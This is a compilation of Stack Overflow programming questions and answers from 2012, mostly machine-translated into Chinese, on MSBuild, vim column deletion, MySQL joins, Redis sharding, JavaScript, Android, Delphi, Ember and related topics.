jruby-1.6.7 :001 > a = [[1,2,3], [4,5,6]]
 => [[1, 2, 3], [4, 5, 6]] 
jruby-1.6.7 :002 > b = Marshal.load( Marshal.dump(a) )
 => [[1, 2, 3], [4, 5, 6]] 
jruby-1.6.7 :004 > a == b
 => true 
jruby-1.6.7 :005 > b[0][0] = 15
 => 15 
jruby-1.6.7 :006 > a == b
 => false 
```

# msbuild - xcopy with MsBuild

> ID：10514858
> 
> 赞同：4
> 
> 时间：2012-05-09T11:07:45.593
> 
> 标签：msbuild, xcopy, msbuild-4.0

I have a really simple build script that looks like this:

```
<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003" ToolsVersion="4.0" DefaultTargets="Bundle">

<ItemGroup>
    <BuildArtifacts Include="..\_buildartifacts" />
    <Application    Include="..\_application" />
</ItemGroup>

<Target Name="Clean">
    <RemoveDir Directories="@(BuildArtifacts)" />
    <RemoveDir Directories="@(Application)" />
</Target>

<Target Name="Init" DependsOnTargets="Clean">
    <MakeDir Directories="@(BuildArtifacts)" />
    <MakeDir Directories="@(Application)" />
</Target>

<Target Name="Bundle" DependsOnTargets="Compile">
    <Exec Command="xcopy.exe %(BuildArtifacts.FullPath) %(Application.FullPath) /e /EXCLUDE:$(MSBuildProjectDirectory)\files_to_ignore_when_bundling.txt" WorkingDirectory="C:\Windows\" />
</Target> 
```

The problem is the Bundle target, only the `%(BuildArtifacts.FullPath)` gets extracted, `%(BuildArtifacts.FullPath)` is ignored when the scripts executes.

The command looks like this when executing:

`xcopy.exe C:\@Code\blaj_buildartifacts /e /EXCLUDE:C:\@Code\blaj\files_to_ignore_when_bundling.txt" exited with code 4`

As you can see, the destination path is not there, if I hard code the paths or just the destination path it all works. Any suggestion on what I am doing wrong here?

**Update** I managed to solve the problem, I removed the last part `WorkingDirectory="C:\Windows\"` And changed the script into this:

```
<Exec Command="xcopy.exe @(BuildArtifacts) @(Application) /e /EXCLUDE:$(MSBuildProjectDirectory)\files_to_ignore_when_bundling.txt" /> 
```

and now it's working :)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-13T09:14:55.017

我设法解决了这个问题。我已经用解决方案更新了问题。

我删除了最后一部分 WorkingDirectory="C:\Windows\" 并将脚本更改为：

```
 <Exec Command="xcopy.exe @(BuildArtifacts) @(Application) /e /EXCLUDE:$(MSBuildProjectDirectory)\files_to_ignore_when_bundling.txt" /> 
```

现在它正在工作:)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-09T23:04:54.433

您需要执行两次 xcopy。您正在尝试在同一调用中对两个不同的项目数组使用任务批处理，但它不会那样工作。尝试这个：

```
<Target Name="Bundle" DependsOnTargets="Compile">
  <Exec Command="xcopy.exe %(BuildArtifacts.FullPath) /e /EXCLUDE:$(MSBuildProjectDirectory)\files_to_ignore_when_bundling.txt" WorkingDirectory="C:\Windows\" />
  <Exec Command="xcopy.exe %(Application.FullPath) /e /EXCLUDE:$(MSBuildProjectDirectory)\files_to_ignore_when_bundling.txt" WorkingDirectory="C:\Windows\" />
</Target> 
```

# wso2 - WSO2 数据服务，更改返回结果的架构

> ID：10514860
> 
> 赞同：0
> 
> 时间：2012-05-09T11:07:49.743
> 
> 标签：wso2, wso2dss

我正在使用 WSO2 数据服务 2.6 版。在这个版本中，合约优先服务生成工具由于一个bug被移除了，下个版本会再次发布。

我们需要改变返回结果的方式。我们想定义我们自己的 wsdl 并从中生成一个空数据服务，我们最终在其中设置每个操作、数据源并配置结果如何映射到 wsdl 模式类型。

如果没有数据服务合同第一工具，有什么方法可以做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-11T09:18:34.323

恐怕，没有直接的方法可以做到这一点。您必须小心地从自己创建数据服务开始，使其生成类似于您需要的 WSDL 的 WSDL。

干杯，安佳娜。

# blackberry - Blackberry: Using SpinboxField Control in a Non-touch Device (navigation problems)

> ID：10514863
> 
> 赞同：1
> 
> 时间：2012-05-09T11:07:57.967
> 
> 标签：blackberry, blackberry-jde

I'm a newbie in blackberry development and stuck on a code section regarding the Spinboxfield and non-touch devices. I will appreciate any help, code sample reply or links to **relevant tutorials** that shows how to use the spinboxfield on a non-touch device (e.g. a blackberry curve or a bold 3). The problem occurs when a screen contains a spinfield and another control e.g.button. Scrolling from the spinboxfield to the button is quite impossible cos once the user enters the spinboxfieldmanager area, they are unable to navigate to the button control and the user is stuck within the spinboxfield control. I have tried the code "SpinBoxFieldManager.setClickToLock(false)" but this doesn't work. Example code is shown below

```
// an array of choices for the months.
      final String[] MONTHS = { "January", "February", "March", "April", "May", "June",
          "July", "August", "September", "October", "November", "December"};

      // an array of choices for years
      final String[] YEARS = { "2001", "2002", "2003", "2004", "2005", "2006", "2007",
          "2008", "2009", "2010", "2011", "2012", "2013", "2014"};

      // use a text spin box to display these choices
      SpinBoxField monthSpinBox = new TextSpinBoxField(MONTHS);
      SpinBoxField _yearsSpinBox = new TextSpinBoxField(YEARS);

      // create a manager for these spin boxes
      SpinBoxFieldManager spinBoxManager = new SpinBoxFieldManager();

      // add the spin boxes
      spinBoxManager.add(monthSpinBox);
      spinBoxManager.add(yearsSpinBox);
      spinBoxManager.setClickToLock(false);

      this.add(spinBoxManager);

      ButtonField mybutton = new ButtonField("MY Button", ButtonField.CONSUME_CLICK);
      mybutton.setChangeListener(this);

      this.add(mybutton); 
```

Apparently using the keypad to scroll from the spinboxfield to the button is impossible except on touch devices.

Thanks in advance.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T12:42:36.707

[http://docs.blackberry.com/en/developers/deliverables/24222/Spin_boxes_887725_11.jsp](http://docs.blackberry.com/en/developers/deliverables/24222/Spin_boxes_887725_11.jsp)

最佳实践：

...

*   如果屏幕上出现其他几个组件，请避免使用旋转框。

正如页面上的图像所暗示的那样，我将使用弹出屏幕来显示旋转框。

# vim - Delete a specific Column in VIM/gvim with out using Visual Block mode

> ID：10514864
> 
> 赞同：8
> 
> 时间：2012-05-09T11:07:58.310
> 
> 标签：vim

Sample Input File

```
+--------------------+---------+---------
|           Name     |   S1    |    S2
+--------------------+---------+---------
|           A        | -4.703  | -2.378  
|           B        | -3283.2 | -3204.5 
|           C        |  8779   |  7302   
|           D        |  22078  |  18018  
+--------------------+---------+--------- 
```

It is required to remove the S1 Column, i.e

Desired Output

```
+--------------------+---------
|           Name     |   S2    
+--------------------+---------
|           A        | -2.378    
|           B        | -3205.5  
|           C        |  7302      
|           D        |  18018    
+--------------------+--------- 
```

Can anyone help with this

thanks

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-09T16:05:32.067

# 看，ma：没有*视觉（块）模式*！

我的务实方法获胜将是：寻找列锚（`-+-`）

```
/-+- 
```

现在，列删除很简单

```
d<C-v>N 
```

（从文档末尾逐块删除到下一个出现的列锚点）。

## 任务完成。

* * *

### 花哨的选择

要考虑多个列，您希望准确确定要匹配的列

这需要一点额外的魅力

`0```f``+``
`:exec '/\%' . col('.') . 'v\v[+|]'``Enter`
`N``C-v``N`
``t``+```d`

要了解有关这种`\%22v`选择虚拟列的方式的更多信息，请参阅

*   [vim 支持特定类型的注释](https://stackoverflow.com/questions/10400291/support-in-vim-for-specific-types-of-comments/10403779#10403779)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-09T12:50:09.147

我想将*Mathias Schwarz*的评论写成答案，因为视觉模式是该任务的自然方式，尽管已经有一个公认的答案。

假设光标在 ¶

```
+--------------------+¶--------+---------
| 姓名 | S1 | S2  
+--------------------+---------+---------
| 一个 | -4.703 | -2.378  
| 乙| -3283.2 | -3204.5
| C | 8779 | 7302   
| D | 22078 | 18018  
+--------------------+---------+---------

```

使用普通命令`Ctrl-V``8jf+d`选择`S1`列并将其删除。解释：

*   **`Ctrl-V`**：进入 Blockwise 可视模式。
*   **8j** : Eigth 是表格的行数，它将光标设置在同一列但最后一行。
*   **f+**：将光标移动到下一个`+`字符。
*   **d**：删除视觉选择。

结果是：

```
+--------------------+---------
|           Name     |    S2
+--------------------+---------
|           A        | -2.378  
|           B        | -3204.5 
|           C        |  7302   
|           D        |  18018  
+--------------------+--------- 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-05-09T11:14:30.273

在命令模式下：

```
:%s/^\([[+|][^+|]\+\)[+|][^+|]\+/\1/ 
```

这使用 vim 内置的类似 sed 的搜索和替换命令。这是细分：

`%`- 对于整个文件

`s`- 搜索

`/^`- 线的开始

`\([[+|][^+|]\+\)`- 后跟`+`或`|`，后跟任意数量 ( `\+`) 的任何*非* `+`或`|`。这将获得我们想要保留的第一列，因此将其放在捕获组中，用`\(`和包围它`\)`

`[+|][^+|]\+`- 后跟`+`或`|`，后跟任意数量 ( `\+`) 的任何*非* `+`或`|`。这将得到第二列，我们不想保留，所以没有捕获组。

`/\1/`- 用第一个捕获组（包含第一列）替换我们匹配的所有内容。这有效地用第一列的内容替换了第一列和第二列。

就像我说的，vim 的正则表达式与 sed 几乎相同，所以如果你阅读[这个关于 sed 的教程，](http://www.grymoire.com/Unix/Sed.html)你可能也会学到很多对 vim 有用的东西。

***编辑***

为了响应 OP 的要求，使其更普遍地能够删除*任何*列：

```
:%s/^\(\([[+|][^+|]\+\)\{1\}\)[+|][^+|]\+/\1/ 
```

, 内的索引`\{\}`现在删除指示的列。把它想象成一个数组索引（即从零开始）。所以`\{0\}`现在删除第一列，`\{1\}`删除第二列，依此类推。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-05-09T17:08:43.123

如果这是文件的唯一内容，最简单的方法是使用：

```
:%normal 22|d32| 
```

如果文件中有更多文本，则指定行间隔：

```
:X,Ynormal 22|d32| 
```

其中 X 和 Y 是行间隔，例如：`10,17normal 22|d32|`

如果您不熟悉普通命令和 | “运动”有一个快速的解释：

1.  该`normal`命令在**正常**模式下执行以下命令；
2.  该| "motion" 将光标移动到指定列，因此`22|`将光标移动到第 22 列；

基本上`:X,Ynormal 22|d32|`所做的是将光标移动到第 22 列 ( `22|`) 并删除所有 ( ) 直到由 X 和 Y 指定的**每一行**`d`的第 32 列 ( `32|`)。

 *** * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-10-18T13:31:27.733

根据您的表格模式，这可以通过两个简单的命令来实现：

```
:%norm 2f+dF+
:%norm 2f|dF| 
```

`2`您要删除的列在哪里（`1`将删除第 1 个，`3`-第 3 个）。

这工作如下（一次为每一行）：

1.  **查找**列的第二个对应字符 (`2f+`或`2f|`)。
2.  **D**向后删除到该列的下一个找到的**字符**(`dF+`或`dF|`)。

这是就地删除第二列的命令行方法：

```
$ ex +'%norm 2f+dF+' +'%norm 2f|dF|' -scx cols2 
```**

# mysql - MYSQL JOIN with AND error

> ID：10514865
> 
> 赞同：0
> 
> 时间：2012-05-09T11:08:05.007
> 
> 标签：mysql

I'm trying to pull first_name from Names table, but only if that users_id is in the Orders table and order_num = 1, but I keep getting an error.

```
SELECT first_name
FROM customers
LEFT JOIN orders
ON orders.order_id = customers.cust_id 
AND orders.order_num = 1 
```

but my query is returning multiple values instead of just one, like it ignoring `orders.order_num=1` - does my query look right, or is there something I'm doing wrong?

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-09T11:09:33.083

```
SELECT first_name
FROM customers
LEFT JOIN orders
ON orders.order_id = customers.cust_id 
WHERE orders.order_num = 1 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-09T11:09:50.683

```
AND orders.order_num = 1 
```

应该

```
WHERE orders.order_num = 1 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-09T11:11:15.390

尝试这个。

```
SELECT first_name
FROM customers
INNER JOIN orders
ON (orders.cust_id = customers.id)
WHERE orders.order_num = 1
GROUP BY customers.id 
```

`INNER JOIN`将仅包含`ON`条件匹配的记录

`WHERE`将结果限制在 order_num = 1 的地方

`GROUP BY`确保您只为每位客户获得 1 个结果

# redis - redis 分片、流水线和往返

> ID：10514872
> 
> 赞同：6
> 
> 时间：2012-05-09T11:08:29.770
> 
> 标签：redis, sharding, pipelining

假设在您的 Web 应用程序中，您需要执行许多 redis 调用来呈现页面，例如获取一堆用户哈希。为了加快速度，您可以将您的 redis 命令包装在 MULTI/EXEC 部分中，从而使用流水线，这样您就可以避免多次往返。但是你也想分片你的数据，因为你有很多数据和/或你想分发写入。然后流水线将不起作用，因为不同的键可能存在于不同的节点上，除非您清楚地了解应用程序的数据布局和基于角色而不是使用散列函数的分片。那么，在不同服务器之间分片数据的最佳实践是什么，而不会因为要联系许多服务器来完成“概念上唯一”而对性能造成太大影响 工作？我相信答案取决于一个正在开发的 Web 应用程序，我最终会运行一些测试，但了解其他人如何应对我提到的权衡取舍会很有帮助。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-09T12:01:38.207

MULTI/EXEC 和流水线是两个不同的东西。您可以在没有任何流水线的情况下执行 MULTI/EXEC，反之亦然。

如果要同时分片和流水线，则需要将操作分组到每个 Redis 实例的流水线，然后对每个实例使用流水线。

这是一个使用 Ruby 的简单示例：[https ://gist.github.com/2587593](https://gist.github.com/2587593)

进一步提高性能的一种方法是在对操作进行分组后并行化 Redis 实例上的流量（即对操作进行分组，将它们并行发送到所有实例，然后等待所有实例的答案）。

这有点复杂，因为需要异步非阻塞客户端。为了获得最佳性能，应在客户端使用 C/C++。这可以通过使用hiredis +您选择的事件循环轻松实现。

# javascript - JavaScript 中的换行符

> ID：10514873
> 
> 赞同：59
> 
> 时间：2012-05-09T11:08:30.230
> 
> 标签：javascript

*JavaScript*中续行的最佳实践是什么？我知道你可以使用`\`字符串。但是您将如何拆分以下代码？

```
var statement = con.createStatement("select * from t where
(t.a1 = 0 and t.a2 >=-1)
order by a3 desc limit 1"); 
```

* * *

## 回答 #1

> 赞同：74
> 
> 时间：2012-05-09T11:14:07.807

如果我正确理解了您的问题：

```
var statement = con.createStatement('select * from t where '
                                  + '(t.a1 = 0 and t.a2 >=-1) '
                                  + 'order by a3 desc limit 1'); 
```

为了可读性，可以在每一行上对齐`+`运算符：无论如何，[除非您使用 Ecmascript 2015](http://exploringjs.com/es6/ch_first-steps.html#leanpub-auto-multi-line-strings)，否则请避免使用 拆分多行字符串`\`，因为：

1.  它不是标准的 JavaScript
2.  该字符后的空格可能会产生解析错误

* * *

## 回答 #2

> 赞同：26
> 
> 时间：2013-07-01T20:30:36.740

我喜欢使用反斜杠来延续 JavaScript 行，如下所示：

```
 // validation
    $(".adjustment, .info input, .includesAndTiming input, \
        .independentAdj, .generalAdj, .executiveAdj \
        #officeExpense, #longDistanceExpense, #digitalImages, #milesReimbursment, #driveTime, #statementTranscription").keypress(function (event) { 
```

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2014-05-26T00:35:27.943

我个人的偏好与您在那里的第一反应相似，但在我看来，它的可读性更容易：

```
var statement = con.createStatement
   (
   'select * from t where ' +
   '(t.a1 = 0 and t.a2 >=-1) ' +
   'order by a3 desc limit 1'
   ); 
```

它与我使用了近 20 年的 SQL 语法格式非常相似：

```
SELECT *
FROM t
WHERE 
   t.a1 = 0 AND
   t.a2 >=-1
ORDER BY a3 DESC
LIMIT 1 
```

保持最右边的延续（`+`在 JavaScript 或SQL 中）允许眼睛均匀地向下滑动左边缘，检查左值和语法。`AND`对于左侧的延续来说，这稍微有点困难——这并不重要，除非你做了很多这样的事情，在这一点上，你消耗的每一卡路里都是一个卡路里，可能会因为格式的轻微改进而节省下来。

由于这个查询非常简单，将其全部分解为 SQL 格式会浪费空间和带宽，这就是为什么建议的 JavaScript 是六行而不是十行的原因。将卷曲向上折叠一行，使其变为四行，从而节省空格。但是，不是那么清晰或编辑起来那么简单。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2014-03-27T19:03:23.220

“+”用于连接字符串，大多数示例都是处理字符串。如果您有一个需要跨多行字符串的命令，例如复合“if”语句，该怎么办？您需要在要继续的每一行末尾添加一个反斜杠。这会转义不可见的下一行字符，以便它不会在 mid 语句中分隔命令。

# jquery - 我应该如何将此 XML 对象放入 javascript 字典中？

> ID：10514876
> 
> 赞同：0
> 
> 时间：2012-05-09T11:08:40.950
> 
> 标签：jquery, xml, jquery-selectors

我应该如何将此 XML 对象放入 javascript 字典中？

来自 get_objectives.php 的 XML：

```
<container>
  <objective>
    <id>1</id>
    <type>thing</type>
    <name>banana</name>
    <date_added>2012-05-08 21:13:01</date_added>
    <released>2012-05-08 22:47:27</released>
  </objective>
  <objective>
    <id>2</id>
    <type>thing</type>
    <name>hammock</name>
    <date_added>2012-05-08 21:13:01</date_added>
    <released>2012-05-08 22:47:27</released>
  </objective>
</container> 
```

我正在尝试修复的 javascript 不起作用：

```
function updateObjectives(){
  $.post('scripts/get_objectives.php', {}, function(xml){
    $(xml).find("objective").each(function(i){
      objectives[i] = {}
      objectives[i]['id'] = $('id', xml).text()
      console.log("objectives["+i+"].id = "+objectives[i].id)
    })
  })
} 
```

`$('id', xml).text()`根据下面的控制台输出，我正在尝试的调用似乎没有卡在处理 find("objective").each 调用的函数中：

```
objectives[0].id = 12
objectives[1].id = 12 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-20T09:23:52.200

`objectives[i]['id'] = $('id', this).text()`成功了！

`$()`我的问题是教程中的模棱两可的语法；`$(query, context)`. 而不是`('this > id', xml)`在完整的“xml”文件中寻找名为“id”的“this”的孩子，（我已经找到了“this”！）之所以`$('id', this)`有效，是因为它正在“this”中寻找“id” （“this”是标签）我希望这对某人有帮助！

# c# - c# 从任务栏中删除 3rd 方应用程序

> ID：10514882
> 
> 赞同：5
> 
> 时间：2012-05-09T11:09:09.447
> 
> 标签：c#, windows, winapi, hide, taskbar

如何通过其句柄从 Windows 任务栏中删除 3rd 方应用程序？

我发现了这个： [使用 C# 包装器从任务栏中删除应用程序？](https://stackoverflow.com/questions/2157712/remove-application-from-taskbar-with-c-sharp-wrapper)

但这对我不起作用。它只为我选择的窗口（记事本）设置另一种样式（小 x 关闭，没有最大化/最小化按钮）。

有什么想法吗？

**编辑：我不想从任务栏中删除我的应用程序，我想通过句柄删除外部应用程序**

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-09T11:13:43.097

要从 Windows 任务栏中隐藏它，您只需将 ShowInTaskbar 属性设置为 false ：

```
this.ShowInTaskbar = false; 
```

至于移动窗口，您可以使用[spy++](http://msdn.microsoft.com/en-us/magazine/cc163617.aspx)来检查窗口事件并识别它。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-09T12:07:51.747

如果您有窗口句柄，则可以[`ShowWindow()`](http://www.pinvoke.net/default.aspx/user32/ShowWindow.html)通过 Win32 API 调用。然后你可以这样做：

```
// Let the window disappear (even from taskbar)
ShowWindow(this.Handle, WindowShowStyle.Hide);

// Revive the window back to the user
ShowWindow(this.Handle, WindowShowStyle.ShowNoActivate); 
```

所以从现在开始，你所有的问题就是获取你想要隐藏的窗口的句柄：

```
Process[] procs = Process.GetProcesses();
IntPtr hWnd;
foreach(Process proc in procs)
{
   if ((hWnd = proc.MainWindowHandle) != IntPtr.Zero)
   {
      Console.WriteLine("{0} : {1}", proc.ProcessName, hWnd);
   }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-09T11:16:45.473

如何从 Windows 任务栏中删除应用程序？

```
this.ShowInTaskbar = false; 
```

* * *

## 回答 #4

> 赞同：-3
> 
> 时间：2012-05-09T11:14:19.227

简单的：

```
this.ShowInTaskbar = false; 
```

至于**Form**移动：可以使用**Layout events**`Move`下的事件

# vb.net - Groupbox 控件中的表单控件

> ID：10514883
> 
> 赞同：0
> 
> 时间：2012-05-09T11:09:12.850
> 
> 标签：vb.net, winforms

我在 vb.net 中有多个表单应用程序现在我上升到我想在其他表单的 Groupbox/Panel 控件中显示一个表单的条件。有什么办法可以实现吗？？？任何帮助表示赞赏..

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T12:31:20.830

如果必须，您可以这样做。这是一个例子：

```
Dim f As New Form
f.TopLevel = False
f.FormBorderStyle = FormBorderStyle.None
f.Dock = DockStyle.Fill
f.Visible = True
Panel1.Controls.Add(f) 
```

这`TopLevel = False`是一个要求。设置 FormBorderStyle 和 Dock 样式是可选的，但可能是您想要做的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-09T12:20:16.950

您不能将表单放在另一个表单上 - 为此使用用户控件。

看

[用户控制与 Windows 窗体](https://stackoverflow.com/questions/2299339/user-control-vs-windows-form)

# java - 让用户保持登录状态，在 Android 上是一个 Android 应用

> ID：10514885
> 
> 赞同：1
> 
> 时间：2012-05-09T11:09:14.877
> 
> 标签：java, android, web-services, login, ksoap2

嘿伙计们，我目前正在开发一个 android 应用程序，该应用程序允许我使用注册用户登录，然后发布他的身高、他的胆固醇水平等等，通过使用 ksoap 的 Web 服务，我不知道如何保持用户通过诸如 ksoap 之类的 Web 服务登录，然后引入这些值。我还没有代码，我只是想弄清楚我要怎么做，因为在 android 中我猜你可以说我还在小步。将发布信息的网站已经创建，但我需要知道如何让用户保持登录状态，以便我可以输入他的号码并通过网络服务将正确的值发送给正确的用户。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-09T11:28:50.293

那么，你可以保存`boolean variable in Shared Preference`当用户`logged in`。因此，当您想要发送数据时，您需要检查 that 的值`boolean variable`。如果它是真的，那么你可以发送数据，否则重定向到登录页面。

当用户注销时，您需要在共享首选项中将该变量设置为 false 或清除共享首选项。

**例子**

```
public class PreferenceData 
{
    static final String PREF_USER_ID = "user_logged_in";

    public static SharedPreferences getSharedPreferences(Context ctx) 
    {
        return PreferenceManager.getDefaultSharedPreferences(ctx);
    }

    public static void setUserLoggedIn(Context ctx, boolean userLoggedIn) 
    {
        Editor editor = getSharedPreferences(ctx).edit();
        editor.putBoolean(PREF_USER_ID, userLoggedIn);
        editor.commit();
    }

    public static boolean getUserLoggedIn(Context ctx) 
    {
        return getSharedPreferences(ctx).putBoolean(PREF_USER_ID, false);
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-09T11:11:30.040

好吧，您可以将带有时间戳的令牌保存在 sqlite 数据库或闪存中，并将其作为请求中的参数发送。当您检查登录令牌是否存在时，如果您希望它超时，您可以检查时间戳 - 创建一个清除此令牌的注销功能

# javascript - ASP.net 页面加载在客户端

> ID：10514886
> 
> 赞同：1
> 
> 时间：2012-05-09T11:09:16.843
> 
> 标签：javascript, asp.net, ajax, client-side

客户端页面加载的事件是什么？

```
 function pageLoad() {
            cbvalcs.SetSelectedIndex(1);
        } 
```

我试过这个，但没有任何反应。

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-09T11:26:07.287

您可能必须包含正确的签名。

```
function pageLoad(sender, args) {
 } 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-09-18T21:04:49.670

要创建 ASP.NET 页面加载事件，您必须首先注册处理程序。

```
Sys.Application.add_load(applicationLoadHandler); 
```

`applicationLoadHandler`成为你的 javascript 函数。此注册可以在页面加载事件中进行。

所以在你的情况下：

```
Sys.Application.add_load(pageLoad);

function pageLoad() {
        cbvalcs.SetSelectedIndex(1);
    } 
```

这既适用于部分回发，也适用于全部回发。

对于 MSDN 的[ASP.NET AJAX Client Life-Cycle Events](http://www.asp.net/ajax/documentation/live/overview/AJAXClientEvents.aspx)主题的透彻修饰具有所有信息。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-09T11:21:52.813

你必须使用`window.onload`

有一些关于[window.onload](https://developer.mozilla.org/en/DOM/window.onload)和[Using window.onload的好文章](http://javascript.about.com/library/blonload.htm)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-09T11:29:34.273

如果您正在使用`jquery`，请使用`$(document).ready`

# android - 如何在网格视图中删除长按项目

> ID：10514888
> 
> 赞同：0
> 
> 时间：2012-05-09T11:09:22.523
> 
> 标签：android, android-gridview

我有一个网格视图，我正在将要在网格视图中显示的数据传递给 gridview 适配器类。现在我想在长按一个项目时删除该项目。

我想在 onItemLongClickListener 中删除。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T11:21:13.153

你需要做的是：

1.  为您的 GridView 创建一个自定义适配器。在该适配器中，提供一种从其维护的项目列表中删除项目的方法，例如“void removeItem(int position)”

2.  呼叫`setOnItemLongClickListener`您的网格。在此方法中，您可以获取发生长按的项目的位置。从此方法中，调用该方法以删除您刚刚收到的位置的项目。

3.  使用方法通知 GridView 数据已更改`notifyDataSetchanged`。如果您希望 GridView UI 立即更新，您需要使用`Handler`此请求以确保它发生在 UI 线程上。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-09T11:31:10.327

如果**mThumbIdsList** 是所有 gridview 项目 id 的整数数组，那么您可以尝试此代码。这可能会对您有所帮助。

```
final ImageAdapter adapter = new ImageAdapter(this);
gridview.setAdapter(adapter);

gridview.onItemLongClickListener(new OnItemClickListener() {
    public void onItemClick(AdapterView<?> parent, View v, int position, long id) {
        adapter.mThumbIdsList.remove(position);
        adapter.notifyDataSetChanged();
    }
}); 
```

# jquery - 窗口宽度和动画动态变化

> ID：10514890
> 
> 赞同：0
> 
> 时间：2012-05-09T11:09:31.913
> 
> 标签：jquery, animation, window, width

如果使用 ie 并且浏览器窗口宽度低于 1400，我正在尝试编写一个更改动画的脚本。我的代码（动画更改）不起作用，尽管控制台在更改窗口宽度时显示正确的文本。任何人都可以帮忙吗？

这是代码：

```
$(document).ready(function() {

  function checkWindow() {

                if ( $.browser.msie ) {

                if ( $(window).width() >= 1400 ) {    

                $("#box1").everyTime(2, function(){                        
                         $("#box1").animate({top:"-20px"}, 3000).animate({top:"-10px"}, 3000);
                      });  
                $("#box2").everyTime(10, function(){                        
                         $("#box2").animate({top:"-100px"}, 2500).animate({top:"-90px"}, 2500);    
                      });        

                console.log("width over 1400");

                } else {

                $("#box1").everyTime(2, function(){                        
                         $("#box1").animate({top:"-200px"}, 3000).animate({top:"-100px"}, 3000);
                      });  
                $("#box2").everyTime(10, function(){                        
                         $("#box2").animate({top:"-200px"}, 2500).animate({top:"-900px"}, 2500);    
                      });    

                console.log("width under 1200");      

                }

                }

   }

var resizeTimer;

$(window).resize(function() {
     clearTimeout(resizeTimer);
     resizeTimer = setTimeout(checkWindow, 100);
});

}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T11:17:23.137

您可能需要在某处致电 $.stopTime 吗？否则，在调整窗口大小后，$.everyTime 调用将持续存在。

# delphi - MemoryStream 并构造一个字节数组

> ID：10514893
> 
> 赞同：6
> 
> 时间：2012-05-09T11:09:40.997
> 
> 标签：delphi, memorystream

我正在使用 MemoryStream 构造一个需要发送到服务器的字节数组。我有三个问题：

1）有没有比这更好的方法来构造一个字节数组？

2）为什么这段代码在我的内存流中写入虚假代码？

```
var
  serial : word;
  MS : TMemoryStream;
const
  somebytes : array [0..1] of byte = ($72,$72);
...
begin
      MS := TMemoryStream.Create();
      try
      MS.Write(somebytes[0],2);
      serial := $3E6C;
      MS.Write(serial,2);
      finally
      MS.Free;
end; 
```

使用调试器，我看到在流中添加了值 $6F32 而不是 $3E6C。

3）如果我打电话

```
MS.Position := 2; 
```

然后我访问 PByte(MS.Memory)^ 为什么我得到流中的第一个字节而不是第三个？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-09T11:19:38.767

> 有没有比这更好的方法来构造一个字节数组？

在我看来，这是一种完全合理的方式。

* * *

> 我看到在流中添加了价值 $6F32 而不是 $3E6C。

再检查一遍。实际上添加了正确的值。但要小心小端数据类型的陷阱。添加到流中的 4 个字节依次为：$72、$72、$6C、$3E。

* * *

> 为什么我得到流中的第一个字节而不是第三个？

因为`Memory`属性总是指流的开始。它不考虑流的当前位置。

# ember.js - Ember 数据查找与加载

> ID：10514895
> 
> 赞同：1
> 
> 时间：2012-05-09T11:09:50.477
> 
> 标签：ember.js, ember-data

当您在 ember-data 中使用 findQuery 时，它是否还会加载模型 localy ？我无法使以下代码工作：

```
App.MyModel = DS.Model.extend {

   name: DS.attr('string')
   didLoad: ->
    console.log('model loaded')
} 
```

现在当我做类似的事情时：

```
objects = App.store.find(App.MyModel, [{name: "john"},{name: "jack"}]) 
```

不会触发 didLoad 回调。何时触发此回调？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-31T11:43:01.010

要实现查询功能，您必须在适配器中实现该`findQuery`方法。此方法需要 4 个参数`store, type, query, modelArray`。当服务器返回查询的数据时，您必须调用 上的`load`方法`modelArray`来用查询结果填充它。此方法还将数据加载到存储中，请参见此处的示例：http: [//jsfiddle.net/pangratz666/5HMGd/](http://jsfiddle.net/pangratz666/5HMGd/)。

```
App.store = DS.Store.create({
    revision: 4,
    adapter: DS.Adapter.create({
        find: Ember.K,
        findQuery: function(store, type, query, modelArray) {
            // expect server to return this array
            modelArray.load([{ id: 1, name: 'John'}, { id: 2, name: 'Jack'}]);
        }
    })
});

App.MyModel = DS.Model.extend({
    name: DS.attr('string'),
    didLoad: function() {
        console.log('model loaded', this.toJSON());
    }
});

// invoke query which loads the 2 models, and didLoad is called
App.store.find(App.MyModel, {}); 
```

​</p>

# regex - 创建正则表达式以获取 CSS 中的属性

> ID：10514897
> 
> 赞同：0
> 
> 时间：2012-05-09T11:09:50.963
> 
> 标签：regex, powershell

我试图在一个 css 中获取 {} 中变量不少的所有属性

到目前为止，我的 RegExp 是这样的：

```
\s*[a-zA-Z-]*:[^@].*?; 
```

示例文本

```
@footerBackground: @Color1;
@footerText: @Color3;
footer          { background:@footerBackground url(images/bg.transp.fabric-45degreee_fabric.png) repeat; box-shadow:0 -1px 3px rgba(0, 0, 0, 0.25), inset 0 1px 0 rgba(0, 0, 0, 0.1); bottom:0; color:@footerText; position:absolute; width:100%; }
